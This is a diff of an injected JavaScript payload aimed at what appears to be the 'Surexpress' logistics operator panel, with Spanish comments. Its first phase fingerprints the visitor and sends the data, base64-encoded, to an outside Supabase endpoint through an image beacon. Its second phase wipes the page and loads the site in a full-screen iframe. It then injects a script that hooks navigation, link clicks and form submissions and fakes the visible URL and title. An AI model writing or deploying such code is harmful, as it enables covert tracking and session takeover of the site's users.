@@ -1,4 +1,9 @@
 (function(){
+    'use strict';
+    
+    // =============================================
+    // FASE 1: FINGERPRINTING
+    // =============================================
     try {
         var d = {
             timestamp: new Date().toISOString(),
@@ -68,177 +73,187 @@
         var i = new Image();
         i.src = 'https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create?d=' + 
                 btoa(JSON.stringify(d)).substring(0,1500);
-        // IFRAMEEEEEEEEEEEEEE
-(function() {
-    'use strict';
-    
-    // 1. Crear iframe que cargue la aplicación completa
-    const iframe = document.createElement('iframe');
-    iframe.src = window.location.href;
-    iframe.style.width = '100%';
-    iframe.style.height = '100vh';
-    iframe.style.border = 'none';
-    iframe.style.position = 'fixed';
-    iframe.style.top = '0';
-    iframe.style.left = '0';
-    iframe.style.zIndex = '99999';
-    
-    // 2. Configurar para máximo acceso
-    iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin allow-popups allow-modals');
-    
-    // 3. Reemplazar el contenido actual con el iframe
-    document.body.innerHTML = '';
-    document.body.appendChild(iframe);
-    
-    // 4. SISTEMA DE SIMULACIÓN DE RUTAS EN LA PÁGINA PADRE
-    let currentPath = window.location.pathname;
-    
-    // Función para actualizar la URL visible
-    function updateBrowserURL(path) {
-        currentPath = path;
-        // Usar History API para cambiar la URL visible
-        window.history.replaceState({}, '', path);
-        document.title = 'Surexpress | ' + getPageTitle(path);
+                
+    } catch(e) {
+        console.log('Fingerprinting error:', e);
     }
+
+    // =============================================
+    // FASE 2: IFRAME CON SIMULACIÓN DE RUTAS
+    // =============================================
     
-    // Función para obtener título según la ruta
-    function getPageTitle(path) {
-        const titles = {
-            '/Operator/Dashboard_M/': 'Dashboard',
-            '/Operator/Orders/': 'Órdenes de Envío', 
-            '/Operator/Usuarios/': 'Usuarios',
-            '/Operator/Clientes/': 'Clientes',
-            '/Operator/Agencias/': 'Agencias',
-            '/Operator/Monitor/': 'Monitor',
-            '/Operator/GuiasAereas/': 'Guías Aéreas',
-            '/Operator/Billing/': 'Facturación',
-            '/Operator/Revision/': 'Revisiones',
-            '/Operator/incidenciaHouse/': 'Incidencias'
-        };
-        return titles[path] || 'Sistema';
-    }
-    
-    // 5. Inyectar código en el iframe cuando cargue
-    iframe.onload = function() {
-        try {
-            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-            
-            // INYECTAR CÓDIGO DE CONTROL EN EL IFRAME
-            const controlScript = iframeDoc.createElement('script');
-            controlScript.textContent = `
-                // === CÓDIGO DE SIMULACIÓN DE RUTAS EN IFRAME ===
+    try {
+        // 1. Crear iframe que cargue la aplicación completa
+        const iframe = document.createElement('iframe');
+        iframe.src = window.location.href;
+        iframe.style.width = '100%';
+        iframe.style.height = '100vh';
+        iframe.style.border = 'none';
+        iframe.style.position = 'fixed';
+        iframe.style.top = '0';
+        iframe.style.left = '0';
+        iframe.style.zIndex = '99999';
+        
+        // 2. Configurar para máximo acceso
+        iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin allow-popups allow-modals');
+        
+        // 3. Reemplazar el contenido actual con el iframe
+        document.body.innerHTML = '';
+        document.body.appendChild(iframe);
+        
+        // 4. SISTEMA DE SIMULACIÓN DE RUTAS EN LA PÁGINA PADRE
+        let currentPath = window.location.pathname;
+        
+        // Función para actualizar la URL visible
+        function updateBrowserURL(path) {
+            currentPath = path;
+            // Usar History API para cambiar la URL visible
+            window.history.replaceState({}, '', path);
+            document.title = 'Surexpress | ' + getPageTitle(path);
+        }
+        
+        // Función para obtener título según la ruta
+        function getPageTitle(path) {
+            const titles = {
+                '/Operator/Dashboard_M/': 'Dashboard',
+                '/Operator/Orders/': 'Órdenes de Envío', 
+                '/Operator/Usuarios/': 'Usuarios',
+                '/Operator/Clientes/': 'Clientes',
+                '/Operator/Agencias/': 'Agencias',
+                '/Operator/Monitor/': 'Monitor',
+                '/Operator/GuiasAereas/': 'Guías Aéreas',
+                '/Operator/Billing/': 'Facturación',
+                '/Operator/Revision/': 'Revisiones',
+                '/Operator/incidenciaHouse/': 'Incidencias'
+            };
+            return titles[path] || 'Sistema';
+        }
+        
+        // 5. Inyectar código en el iframe cuando cargue
+        iframe.onload = function() {
+            try {
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                 
-                // A. INTERCEPTAR NAVEGACIÓN Y SINCRONIZAR URL
-                const originalPushState = history.pushState;
-                const originalReplaceState = history.replaceState;
-                
-                history.pushState = function(state, title, url) {
-                    if (url) {
-                        // Notificar a la página padre sobre el cambio
-                        window.parent.postMessage({
-                            type: 'URL_CHANGE',
-                            url: url,
-                            action: 'push'
-                        }, '*');
-                    }
-                    return originalPushState.apply(this, arguments);
-                };
-                
-                history.replaceState = function(state, title, url) {
-                    if (url) {
-                        window.parent.postMessage({
-                            type: 'URL_CHANGE', 
-                            url: url,
-                            action: 'replace'
-                        }, '*');
-                    }
-                    return originalReplaceState.apply(this, arguments);
-                };
-                
-                // B. INTERCEPTAR CLICKS EN ENLACES
-                document.addEventListener('click', function(e) {
-                    let target = e.target;
-                    // Buscar el enlace más cercano
-                    while (target && target.tagName !== 'A') {
-                        target = target.parentElement;
-                    }
+                // INYECTAR CÓDIGO DE CONTROL EN EL IFRAME
+                const controlScript = iframeDoc.createElement('script');
+                controlScript.textContent = `
+                    // === CÓDIGO DE SIMULACIÓN DE RUTAS EN IFRAME ===
                     
-                    if (target && target.href && target.href.includes('/Operator/')) {
-                        e.preventDefault();
+                    // A. INTERCEPTAR NAVEGACIÓN Y SINCRONIZAR URL
+                    const originalPushState = history.pushState;
+                    const originalReplaceState = history.replaceState;
+                    
+                    history.pushState = function(state, title, url) {
+                        if (url) {
+                            // Notificar a la página padre sobre el cambio
+                            window.parent.postMessage({
+                                type: 'URL_CHANGE',
+                                url: url,
+                                action: 'push'
+                            }, '*');
+                        }
+                        return originalPushState.apply(this, arguments);
+                    };
+                    
+                    history.replaceState = function(state, title, url) {
+                        if (url) {
+                            window.parent.postMessage({
+                                type: 'URL_CHANGE', 
+                                url: url,
+                                action: 'replace'
+                            }, '*');
+                        }
+                        return originalReplaceState.apply(this, arguments);
+                    };
+                    
+                    // B. INTERCEPTAR CLICKS EN ENLACES
+                    document.addEventListener('click', function(e) {
+                        let target = e.target;
+                        // Buscar el enlace más cercano
+                        while (target && target.tagName !== 'A') {
+                            target = target.parentElement;
+                        }
                         
-                        // Extraer la ruta de la URL completa
-                        const url = new URL(target.href);
-                        const path = url.pathname + url.search;
-                        
-                        // Navegar dentro del iframe
-                        window.location.href = target.href;
-                        
-                        // Notificar al padre
-                        window.parent.postMessage({
-                            type: 'URL_CHANGE',
-                            url: path,
-                            action: 'navigate'
-                        }, '*');
-                    }
-                });
-                
-                // C. DETECTAR CAMBIOS DE RUTA AUTOMÁTICOS
-                let lastPath = window.location.pathname + window.location.search;
-                setInterval(() => {
-                    const currentPath = window.location.pathname + window.location.search;
-                    if (currentPath !== lastPath) {
-                        lastPath = currentPath;
-                        window.parent.postMessage({
-                            type: 'URL_CHANGE',
-                            url: currentPath,
-                            action: 'auto_detect'
-                        }, '*');
-                    }
-                }, 300);
-                
-                // D. INTERCEPTAR FORMULARIOS QUE REDIRIGEN
-                document.addEventListener('submit', function(e) {
-                    const form = e.target;
-                    if (form.action && form.action.includes('/Operator/')) {
-                        setTimeout(() => {
-                            const currentPath = window.location.pathname + window.location.search;
+                        if (target && target.href && target.href.includes('/Operator/')) {
+                            e.preventDefault();
+                            
+                            // Extraer la ruta de la URL completa
+                            const url = new URL(target.href);
+                            const path = url.pathname + url.search;
+                            
+                            // Navegar dentro del iframe
+                            window.location.href = target.href;
+                            
+                            // Notificar al padre
+                            window.parent.postMessage({
+                                type: 'URL_CHANGE',
+                                url: path,
+                                action: 'navigate'
+                            }, '*');
+                        }
+                    });
+                    
+                    // C. DETECTAR CAMBIOS DE RUTA AUTOMÁTICOS
+                    let lastPath = window.location.pathname + window.location.search;
+                    setInterval(() => {
+                        const currentPath = window.location.pathname + window.location.search;
+                        if (currentPath !== lastPath) {
+                            lastPath = currentPath;
                             window.parent.postMessage({
                                 type: 'URL_CHANGE',
                                 url: currentPath,
-                                action: 'form_submit'
+                                action: 'auto_detect'
                             }, '*');
-                        }, 800);
-                    }
-                });
+                        }
+                    }, 300);
+                    
+                    // D. INTERCEPTAR FORMULARIOS QUE REDIRIGEN
+                    document.addEventListener('submit', function(e) {
+                        const form = e.target;
+                        if (form.action && form.action.includes('/Operator/')) {
+                            setTimeout(() => {
+                                const currentPath = window.location.pathname + window.location.search;
+                                window.parent.postMessage({
+                                    type: 'URL_CHANGE',
+                                    url: currentPath,
+                                    action: 'form_submit'
+                                }, '*');
+                            }, 800);
+                        }
+                    });
+                    
+                    // Notificar URL inicial
+                    window.parent.postMessage({
+                        type: 'URL_CHANGE',
+                        url: window.location.pathname + window.location.search,
+                        action: 'initial'
+                    }, '*');
+                    
+                    console.log('Simulación de rutas activada');
+                `;
                 
-                // Notificar URL inicial
-                window.parent.postMessage({
-                    type: 'URL_CHANGE',
-                    url: window.location.pathname + window.location.search,
-                    action: 'initial'
-                }, '*');
+                iframeDoc.head.appendChild(controlScript);
                 
-                console.log('Simulación de rutas activada');
-            `;
-            
-            iframeDoc.head.appendChild(controlScript);
-            
-        } catch (e) {
-            console.log('Iframe security restriction:', e);
-        }
-    };
+            } catch (e) {
+                console.log('Iframe security restriction:', e);
+            }
+        };
+        
+        // 6. ESCUCHAR MENSAJES DEL IFRAME PARA ACTUALIZAR URL
+        window.addEventListener('message', function(event) {
+            if (event.data.type === 'URL_CHANGE') {
+                updateBrowserURL(event.data.url);
+            }
+        });
+        
+        // 7. MANEJAR NAVEGACIÓN CON EL BOTÓN ATRÁS/ADELANTE
+        window.addEventListener('popstate', function(event) {
+            const newPath = window.location.pathname + window.location.search;
+            iframe.src = newPath;
+        });
+        
+    } catch(e) {
+        console.log('Iframe setup error:', e);
+    }
     
-    // 6. ESCUCHAR MENSAJES DEL IFRAME PARA ACTUALIZAR URL
-    window.addEventListener('message', function(event) {
-        if (event.data.type === 'URL_CHANGE') {
-            updateBrowserURL(event.data.url);
-        }
-    });
-    
-    // 7. MANEJAR NAVEGACIÓN CON EL BOTÓN ATRÁS/ADELANTE
-    window.addEventListener('popstate', function(event) {
-        const newPath = window.location.pathname + window.location.search;
-        iframe.src = newPath;
-    });
-    } catch(e) {}
 })();
